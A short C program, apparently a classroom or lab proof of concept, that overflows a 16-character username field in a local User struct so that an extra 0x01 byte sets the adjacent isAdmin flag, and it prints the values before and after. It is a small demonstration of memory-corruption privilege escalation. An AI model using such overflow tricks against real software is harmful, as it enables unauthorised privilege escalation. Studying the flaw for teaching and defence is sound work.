#include <stdio.h>
#include "code.h"

int main() {
    User user = {"pwned", 0};
    printf("Before:\n");
    printf("[*] username : %s\n", user.username);
    printf("[*] isAdmin  : %d\n", user.isAdmin);
    printf("...\n");

    // 16자 + 1바이트(0x01)로 isAdmin을 덮어쓰기 위한 exploit
    char exploit[18] = "aaaaaaaaaaaaaaaa"; // 16자
    exploit[16] = 1; // isAdmin 메모리 영역 덮어쓰기
    exploit[17] = '\0';

    setUsername(&user, exploit);

    printf("After:\n");
    printf("[*] username : %s\n", user.username);
    printf("[*] isAdmin  : %d\n", user.isAdmin);

    return 0;
}
